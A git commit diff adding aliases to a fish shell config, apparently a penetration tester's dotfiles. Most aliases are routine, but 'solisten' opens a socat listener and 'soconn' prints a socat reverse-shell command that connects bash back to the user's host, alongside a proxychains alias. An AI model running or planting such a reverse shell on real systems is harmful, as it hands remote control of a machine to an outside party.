80411c86aa842bb88956b7c8dd23af019cd1681c
cinerieus <cinereus@protonmail.com>
2022-12-15 11:12:30 +0000

    Update config.fish

--- config.fish
+++ config.fish
@@ -1,3 +1,13 @@
+alias px='proxychains -q'
+alias ls='ls --color=auto'
+alias ll='ls --color=auto -lah'
+alias copy='rsync -ah --info=progress2'
+alias cls='clear'
+alias solisten='socat file:`tty`,raw,echo=0 tcp-listen:$LPORT'
+alias soconn='echo "socat exec:\"bash -li\",pty,stderr,setsid,sigint,sane tcp:[$(hostname -i)]:$LPORT"'
+alias nv='nvim'
+alias gostatic="go build --ldflags '-s -w -linkmode external -extldflags "-static"'"
+
 if status is-interactive
     set theme_complete_path yes
     set fish_prompt_pwd_dir_length 0
